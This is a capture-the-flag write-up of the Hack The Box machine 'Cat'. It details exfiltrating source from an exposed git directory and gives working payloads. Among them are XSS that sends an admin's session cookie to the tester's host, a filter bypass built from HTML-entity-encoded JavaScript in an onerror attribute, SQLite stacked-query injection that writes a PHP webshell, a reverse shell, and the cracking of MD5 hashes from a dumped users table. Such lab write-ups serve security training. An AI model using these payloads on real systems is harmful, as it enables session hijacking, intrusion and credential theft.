---
maquina: "Cat"
dificultad: "Medium"
os: "Linux"
plataforma: "htb"
release: "01 Feb 2025"
retire: "05 Jul 2025"
creadores: "FisMatHack"
htb_url: "https://hackthebox.com/machines/cat"
app_url: "https://app.hackthebox.com/machines/646"
url: "https://0xdf.gitlab.io/2025/07/05/htb-cat.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

I’ll leak the source code for the Cat website from an exposed git directory. I’ll use XSS to capture the admin user’s cookie, and then a SQL injection to get a webshell on the host and remote code execution. I’ll pivot to the next user by cracking a hash in the web application database. I’ll find the next user’s password in the Apache access logs. Finally, I’ll exploit a vulnerability in a private Gitea instance to get root.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.53
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 14:39 EST
Nmap scan report for 10.10.11.53
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.53
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 14:39 EST
Nmap scan report for 10.10.11.53
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
```

Based on the [OpenSSH and Apache versions](https://0xdf.gitlab.io/cheatsheets/os#ubuntu), the host is likely running Ubuntu 20.04 focal.

The webserver is redirecting to `cat.htb`. I’ll brute force for subdomains that respond differently with `ffuf` and not find any, so I’ll update my `hosts` file to:

```plaintext
10.10.11.53 cat.htb
```

I’ll rescan the host by hostname, and it finds a `.git` directory exposed on the webserver:

```console
oxdf@hacky$ nmap -p 80 -sCV cat.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 15:54 EST
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Best Cat Competition
| http-git:
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
```

### Website - TCP 80

#### Site

The site is for some kind of cat competition:

![image-20250203152842222](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203152842222.png)

The vote page has pictures of cats with buttons to vote, but they aren’t tied to any action and it says voting is closed:

![image-20250203153103112](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203153103112.png)

Winners shows these same three cats ranked 1-3. Contest returns a redirect to `/join.php`, the same as Join. It has a registration page and a login page.

After registering and logging in, the Contest page has a form to register a cat:

![image-20250203153300918](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203153300918.png)

Filling out the form and submitting it shows a message:

![image-20250203153350551](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203153350551.png)

#### Tech Stack

The page extensions show that the site is clearly PHP. The initial GET request to `/` returns a `PHPSESSID` cookie as well:

```http
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 20:29:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=h9rs7gar88khrprp3n47ngnahv; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3075
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

The cookie is not HttpOnly:

![image-20250203173433660](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203173433660.png)

The 404 page is the [Apache default 404](https://0xdf.gitlab.io/cheatsheets/404#apache--httpd):

![image-20250203153506287](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203153506287.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```console
oxdf@hacky$ feroxbuster -u http://cat.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cat.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      269c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      140l      327w     4004c http://cat.htb/join.php
200      GET      127l      270w     2900c http://cat.htb/css/styles.css
301      GET        9l       28w      304c http://cat.htb/uploads => http://cat.htb/uploads/
200      GET        1l        0w        1c http://cat.htb/config.php
302      GET        1l        0w        1c http://cat.htb/admin.php => http://cat.htb/join.php
302      GET        0l        0w        0c http://cat.htb/logout.php => http://cat.htb/
200      GET      129l      285w     3075c http://cat.htb/index.php
301      GET        9l       28w      300c http://cat.htb/css => http://cat.htb/css/
302      GET        1l        0w        1c http://cat.htb/contest.php => http://cat.htb/join.php
200      GET       41l       83w     1242c http://cat.htb/vote.php
301      GET        9l       28w      300c http://cat.htb/img => http://cat.htb/img/
200      GET      196l      415w     5082c http://cat.htb/winners.php
200      GET      129l      285w     3075c http://cat.htb/
200      GET      127l      270w     2900c http://cat.htb/css/styles
200      GET      127l      715w    53503c http://cat.htb/img/cat3.webp
200      GET      304l     1647w   132808c http://cat.htb/img/cat1.jpg
200      GET      904l     5604w   448419c http://cat.htb/img/cat2.png
301      GET        9l       28w      304c http://cat.htb/winners => http://cat.htb/winners/
200      GET      127l      715w    53503c http://cat.htb/img_winners/cat3.webp
200      GET      304l     1647w   132808c http://cat.htb/img_winners/cat1.jpg
200      GET      904l     5604w   448419c http://cat.htb/img_winners/cat2.png
200      GET      304l     1647w   132808c http://cat.htb/img/cat1
[####################] - 4m    150022/150022  0s      found:22      errors:437
[####################] - 3m     30000/30000   150/s   http://cat.htb/
[####################] - 3m     30000/30000   153/s   http://cat.htb/uploads/
[####################] - 3m     30000/30000   156/s   http://cat.htb/css/
[####################] - 3m     30000/30000   151/s   http://cat.htb/img/
[####################] - 3m     30000/30000   167/s   http://cat.htb/winners/
```

There’s a few interesting paths here.

`/admin.php` just redirects back to the login / registration page.

`/uploads` (after redirect to `/uploads/`) returns a 403 forbidden. This is likely where my uploaded image goes. I’ll try `/uploads/[png filename]`, but it returns 404 not found.

It’s a bit weird that there’s `/img` and `/img_winners`. Both lead to 403s. `/winners` does as well.

I don’t need to dig too much further here as I can download the `.git` repo.

### Source

#### Get Repo

I’ll use [git-dumper](https://github.com/arthaud/git-dumper) to download the repository:

```console
oxdf@hacky$ git-dumper http://cat.htb/.git git
[-] Testing http://cat.htb/.git/HEAD [200]
[-] Testing http://cat.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://cat.htb/.gitignore [404]
[-] http://cat.htb/.gitignore responded with status code 404
[-] Fetching http://cat.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://cat.htb/.git/description [200]
[-] Fetching http://cat.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://cat.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://cat.htb/.git/hooks/post-commit.sample [404]
[-] http://cat.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://cat.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://cat.htb/.git/hooks/post-receive.sample [404]
[-] http://cat.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://cat.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://cat.htb/.git/hooks/update.sample [200]
[-] Fetching http://cat.htb/.git/index [200]
[-] Fetching http://cat.htb/.git/objects/info/packs [404]
[-] http://cat.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://cat.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://cat.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://cat.htb/.git/info/exclude [200]
[-] Finding refs/
[-] Fetching http://cat.htb/.git/FETCH_HEAD [404]
[-] http://cat.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://cat.htb/.git/HEAD [200]
[-] Fetching http://cat.htb/.git/ORIG_HEAD [404]
[-] http://cat.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://cat.htb/.git/config [200]
[-] Fetching http://cat.htb/.git/info/refs [404]
[-] http://cat.htb/.git/info/refs responded with status code 404
[-] Fetching http://cat.htb/.git/logs/HEAD [200]
[-] Fetching http://cat.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://cat.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://cat.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://cat.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://cat.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://cat.htb/.git/packed-refs [404]
[-] http://cat.htb/.git/packed-refs responded with status code 404
[-] Fetching http://cat.htb/.git/refs/heads/master [200]
[-] Fetching http://cat.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://cat.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://cat.htb/.git/refs/remotes/origin/master [404]
[-] http://cat.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://cat.htb/.git/refs/stash [404]
[-] http://cat.htb/.git/refs/stash responded with status code 404
[-] Fetching http://cat.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://cat.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://cat.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://cat.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://cat.htb/.git/logs/refs/stash [404]
[-] http://cat.htb/.git/logs/refs/stash responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://cat.htb/.git/objects/0c/be0133fb00b13165bd7318e42e17f322daac7f [200]
[-] Fetching http://cat.htb/.git/objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028 [200]
[-] Fetching http://cat.htb/.git/objects/38/660821153b31dbbee89396eacf974c095ab0dc [200]
[-] Fetching http://cat.htb/.git/objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5 [200]
[-] Fetching http://cat.htb/.git/objects/88/12266cb97013f416c175f9a9fa08aae524c92a [200]
[-] Fetching http://cat.htb/.git/objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5 [200]
[-] Fetching http://cat.htb/.git/objects/56/03bb235ee634e1d7914def967c26f9dd0963bb [200]
[-] Fetching http://cat.htb/.git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5 [200]
[-] Fetching http://cat.htb/.git/objects/91/92afa265e9e73f533227e4f118f882615d3640 [200]
[-] Fetching http://cat.htb/.git/objects/9b/e1a76f22449a7876a712d34dc092f477169c36 [200]
[-] Fetching http://cat.htb/.git/objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2 [200]
[-] Fetching http://cat.htb/.git/objects/64/d98c5af736de120e17eff23b17e22aad668718 [200]
[-] Fetching http://cat.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://cat.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://cat.htb/.git/objects/31/e87489c5f8160f895e941d00087bea94f21315 [200]
[-] Fetching http://cat.htb/.git/objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8 [200]
[-] Fetching http://cat.htb/.git/objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4 [200]
[-] Fetching http://cat.htb/.git/objects/c9/e281ffb3f5431800332021326ba5e97aeb2764 [200]
[-] Fetching http://cat.htb/.git/objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222 [200]
[-] Fetching http://cat.htb/.git/objects/cf/8166a8873d413e6afd88fa03305880e795a2c6 [200]
[-] Fetching http://cat.htb/.git/objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc [200]
[-] Fetching http://cat.htb/.git/objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86 [200]
[-] Fetching http://cat.htb/.git/objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1 [200]
[-] Running git checkout .
```

In the downloaded directory, I’ll run `git checkout .` to get the latest version of the files:

```console
oxdf@hacky$ git checkout .
Updated 19 paths from the index
oxdf@hacky$ ls
accept_cat.php  admin.php  config.php  contest.php  css  delete_cat.php  img  img_winners  index.php  join.php  logout.php  view_cat.php  vote.php  winners  winners.php
```

There’s only one commit to the repo:

```console
oxdf@hacky$ git log
commit 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 (HEAD -> master)
Author: Axel <axel2017@gmail.com>
Date:   Sat Aug 31 23:26:14 2024 +0000

    Cat v1
```

`axel2017@gmail.com` is not in scope here.

#### Config

The `config.php` file really just handles the database connection:

```php
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```

It’s a SQLite database located at `/databases/cat.db`. Because it’s SQLite, there’s no username or password for the connection.

#### Cat Submission

The `contest.php` page is what handles when a cat is submitted for review. At the top of this page, there’s a check for forbidden characters:

```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $cat_name = $_POST['cat_name'];
    $age = $_POST['age'];
    $birthdate = $_POST['birthdate'];
    $weight = $_POST['weight'];

    $forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";

    // Check for forbidden content
    if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
        contains_forbidden_content($age, $forbidden_patterns) ||
        contains_forbidden_content($birthdate, $forbidden_patterns) ||
        contains_forbidden_content($weight, $forbidden_patterns)) {
        $error_message = "Your entry contains invalid characters.";
    } else {
```

If the inputs all pass, it will generate a random name for the image, validate that it is an image, the right extension, not too big, and doesn’t already exist, and then, if that’s all good, write the data to the database:

```php
            if (move_uploaded_file($_FILES["cat_photo"]["tmp_name"], $target_file)) {
                // Prepare SQL query to insert cat data
                $stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");
                // Bind parameters
                $stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
                $stmt->bindParam(':age', $age, PDO::PARAM_INT);
                $stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
                $stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
                $stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
                $stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
                // Execute query
                if ($stmt->execute()) {
                    $success_message = "Cat has been successfully sent for inspection.";
                } else {
                    $error_message = "Error: There was a problem registering the cat.";
                }
            } else {
                $error_message = "Error: There was a problem uploading the file.";
            }
```

#### Admin

On the `admin.php` page, there’s a check that the logged in user’s username is axel:

```php
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}
```

It gets all the cats from the `cats` DB table:

```php
$stmt = $pdo->prepare("SELECT * FROM cats");
$stmt->execute();
$cats = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
```

And later displays them:

```php
<div class="container">
    <h1>My Cats</h1>
    <?php foreach ($cats as $cat): ?>
        <div class="cat-card">
            <img src="<?php echo htmlspecialchars($cat['photo_path']); ?>" alt="<?php echo htmlspecialchars($cat['cat_name']); ?>" class="cat-photo">
            <div class="cat-info">
                <strong>Name:</strong> <?php echo htmlspecialchars($cat['cat_name']); ?><br>
            </div>
            <button class="view-button" onclick="window.location.href='/view_cat.php?cat_id=<?php echo htmlspecialchars($cat['cat_id']); ?>'">View</button>
            <button class="accept-button" onclick="acceptCat('<?php echo htmlspecialchars($cat['cat_name']); ?>', <?php echo htmlspecialchars($cat['cat_id']); ?>)">Accept</button>
            <button class="reject-button" onclick="rejectCat(<?php echo htmlspecialchars($cat['cat_id']); ?>)">Reject</button>
        </div>
    <?php endforeach; ?>
</div>
```

There’s also a `view_cat.php` page (linked to from this admin view) that’s only available to the axel user, and shows details on the cat:

```php
<div class="container">
    <h1>Cat Details: <?php echo $cat['cat_name']; ?></h1>
    <img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
    <div class="cat-info">
        <strong>Name:</strong> <?php echo $cat['cat_name']; ?><br>
        <strong>Age:</strong> <?php echo $cat['age']; ?><br>
        <strong>Birthdate:</strong> <?php echo $cat['birthdate']; ?><br>
        <strong>Weight:</strong> <?php echo $cat['weight']; ?> kg<br>
        <strong>Owner:</strong> <?php echo $cat['username']; ?><br>
        <strong>Created At:</strong> <?php echo $cat['created_at']; ?>
    </div>
</div>
```

#### Accepting Cats

The `admin.php` page has links to accept and delete cats. When the accept button is pushed, it sends a request to `accept_cat.php`. It starts by making sure that the user is axel, that it’s a POST request, and that the parameters are set correctly:

```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
...[snip]...
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
```

Then is gets the id and name and inserts that into the `accepted_cats` table, and removes it from the `cats` table:

```php
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
```

For some reason, this is the only time in the entire code that `$pdo->exec` is called on a raw string, which will be vulnerable to SQL injection should I gain access to the admin panel.

## Shell as www-data

### Admin Site Access

#### Basic XSS Fails

It seems likely that an admin is checking the submitted cats to accept or reject them. Before looking at the source code, I’ll check about adding HTML injection / XSS tests to the various fields in the contest form:

![image-20250203154950499](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203154950499.png)

No matter what I try, if `<` is in any field, it returns:

![image-20250203155117912](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203155117912.png)

That matches what I observed above, as any character in `[+*{}',;<>()\\[\\]\\/\\:]` should be rejected.

#### Multiple XSS Paths

I’ll show two ways to bypass this filter and steal the admin cookie. The first is via a standard XSS payload in the username field. The second is using an HTML injection with `"` to inject HTML-encoded JavaScript (with it’s `;` removed) into an `onerror` field.

#### via Username XSS

Even without access to the source, it’s reasonable to think that the username may be displayed back to the admin while viewing the cat entries. I don’t submit it with the form, so it would be taken from the session.

And the source confirms that is what happens. So I’ll register a user with the name `0xdf<script>var i = new Image(); i.src="http://10.10.14.6/?c=" + document.cookie;</script>`. Then I’ll submit a cat with dummy values, and that HTML script is injected into the page. A few seconds later:

```console
10.10.11.53 - - [03/Feb/2025 17:41:14] "GET /?c=PHPSESSID=vakha8c53alin8oq8350imggf0 HTTP/1.1" 200 -
```

That’s the admin’s cookie.

#### via HTML Injection

One character that isn’t in the block list is `"`. On `admin.php`, there’s an `img` tag:

```php
<img src="<?php echo htmlspecialchars($cat['photo_path']); ?>" alt="<?php echo htmlspecialchars($cat['cat_name']); ?>" class="cat-photo">
```

`$cat['photo_path']` is outside of my control. But I can control `$cat['cat_name']`, assuming it passed the block list. So if I pass in `alt" onerror="" oxdf="` as the cat name, then the resulting `img` tag would be:

```php
<img src="<?php echo htmlspecialchars($cat['photo_path']); ?>" alt="alt" onerror="" oxdf="" class="cat-photo">
```

As long as I can make the image error, I can execute what I set as `onerror`.

This raises the question of what to put in there without access to characters like `(`, `)`, `;`, or `'`.

Something I learned doing this box is that inside an `onerror` tag, JavaScript will execute HTML encoded strings. *And*, this will work even if the `;` is missing at the end of each character! As a local test, I’ll create `index.html`:

```html
<html>
        <head>
        </head>
        <body>
                <img src="x" onerror="&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29&#x3b" />
        </body>
</html>
```

The `onerror` decodes to `alert(1)` though the `;` are missing. Opening this page in Firefox shows the alert:

![image-20250203174940083](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203174940083.png)

Because `&` and `#` are not blocked, I can make any string I want.

```js
var i = new Image(); i.src="http://10.10.14.6/?c=" + document.cookie
```

Becomes:

```plaintext
&#x76&#x61&#x72&#x20&#x69&#x20&#x3d&#x20&#x6e&#x65&#x77&#x20&#x49&#x6d&#x61&#x67&#x65&#x28&#x29&#x3b&#x20&#x69&#x2e&#x73&#x72&#x63&#x3d&#x22&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x31&#x30&#x2e&#x31&#x30&#x2e&#x31&#x34&#x2e&#x36&#x2f&#x3f&#x63&#x3d&#x22&#x20&#x2b&#x20&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x63&#x6f&#x6f&#x6b&#x69&#x65
```

So the full payload becomes:

```plaintext
alt" onerror="&#x76&#x61&#x72&#x20&#x69&#x20&#x3d&#x20&#x6e&#x65&#x77&#x20&#x49&#x6d&#x61&#x67&#x65&#x28&#x29&#x3b&#x20&#x69&#x2e&#x73&#x72&#x63&#x3d&#x22&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x31&#x30&#x2e&#x31&#x30&#x2e&#x31&#x34&#x2e&#x36&#x2f&#x3f&#x63&#x3d&#x22&#x20&#x2b&#x20&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x63&#x6f&#x6f&#x6b&#x69&#x65" oxdf="
```

I’ll send a legit submission to Burp Repeater. I’ll replace the cat name with that payload, and chop down the image so that it still checks out as a PNG by magic bytes, but also fails when loaded into Firefox:

![image-20250203181927526](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203181927526.png)

Within a few seconds, there’s an admin cookie:

```console
10.10.11.53 - - [03/Feb/2025 18:17:52] "GET /?c=PHPSESSID=akukm6g15pek4m46n9ut8uu14a HTTP/1.1" 200 -
```

### SQL Injection

#### Admin

With an admin cookie I can see the `admin.php` page. I’ll submit a new cat (from another browser) and see it show up:

![image-20250203183424472](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203183424472.png)

I’m interested in the accept path (I noted SQL injection above), so I’ll click:

![image-20250203183432900](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203183432900.png)

And click ok.

#### SQLI POC

I’ll send the accept POST request to Burp Repeater and put a `'` in the name:

![image-20250203183621051](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203183621051.png)

It crashes. I know this is SQLite from [above](https://0xdf.gitlab.io/2025/07/05/htb-cat.html#config), so I can likely do stacked commands.

#### File Write POC

The [PayloadsAllTheThings page on SQLite injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#attach-database) shows how to write a file:

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

Basically, I’m going to create a new SQL database named with a `.php` extension, and then write a webshell into it. When I load this SQLite DB, the webshell will be executed as PHP code.

My payload will first have to close out the existing query with `muffins');`. Then I can stack the next three like above:

```plaintext
muffins'); ATTACH DATABASE '/var/www/0xdf.php' as db; CREATE TABLE db.pwn (stuff text); INSERT INTO db.pwn (stuff) VALUES ("test");-- -
```

I’ll add that to the request, URL encode it, and send it:

![image-20250203185923128](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203185923128.png)

It crashes, and the file’s not there. It’s possible that the web root isn’t `/var/www/`. I’ll try a relative write:

![image-20250203190033069](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203190033069.png)

It works! The text is there:

![image-20250203190113752](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203190113752.png)

#### Webshell

I’ll update that payoad to include a webshell:

![image-20250203190450210](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203190450210.png)

I have to change the PHP file name (or wait for the cleanup script). It works:

![image-20250203190513770](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203190513770.png)

I’ll put a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in as the command, and get a shell:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.53 44642
bash: cannot set terminal process group (978): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cat:/var/www/cat.htb$
```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@cat:/var/www/cat.htb$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@cat:/var/www/cat.htb$ ^Z
[1]+  Stopped                 nc -lnvp 444
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 444
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@cat:/var/www/cat.htb$
```

## Shell as rosa

### Enumeration

#### Users

There are four users on this box with home directories in `/home`:

```console
www-data@cat:/home$ ls
axel  git  jobert  rosa
```

That matches the users in `passwd` with shells set:

```console
www-data@cat:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
```

www-data can’t get into any of them.

#### Database

The web directory looks just like what I already found. The database is in `/databases`, where I can access it directly now:

```console
www-data@cat:/databases$ sqlite3 cat.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
accepted_cats  cats           users
```

It has three tables. The only interesting one is `users`:

```console
sqlite> .headers on
sqlite> select * from users;
user_id|username|email|password
1|axel|axel2017@gmail.com|d1bbba3670feb9435c9841e46e60ee2f
2|rosa|rosamendoza485@gmail.com|ac369922d560f17d6eeb8b2c7dec498c
3|robert|robertcervantes2000@gmail.com|42846631708f69c00ec0c0a8aa4a92ad
4|fabian|fabiancarachure2323@gmail.com|39e153e825c4a3d314a0dc7f7475ddbe
5|jerryson|jerrysonC343@gmail.com|781593e060f8d065cd7281c5ec5b4b86
6|larry|larryP5656@gmail.com|1b6dce240bbfbc0905a664ad199e18f8
7|royer|royer.royer2323@gmail.com|c598f6b844a36fa7836fba0835f1f6
8|peter|peterCC456@gmail.com|e41ccefa439fc454f7eadbf1f139ed8a
9|angel|angel234g@gmail.com|24a8ec003ac2e1b3c5953a6f95f8f565
10|jobert|jobert2020@gmail.com|88e4dceccd48820cf77b5cf6c08698ad
11|0xdf|0xdf@cat.htb|465e929fc1e0853025faad58fc8cb47d
```

### Shell

#### Crack Hashes

Just looking at those hashes, it’s pretty clear that they are 32 hex characters and thus likely MD5. The source code in `join.php` makes this definitive:

```php
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);
```

I’ll dump them into [CrackStation](https://crackstation.net/):

![image-20250203211240118](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203211240118.png)

Only the second one (rosa) and mine crack.

#### su / SSH

That password works for rosa with `su`:

```console
www-data@cat:/var/www$ su - rosa
Password:
rosa@cat:~$
```

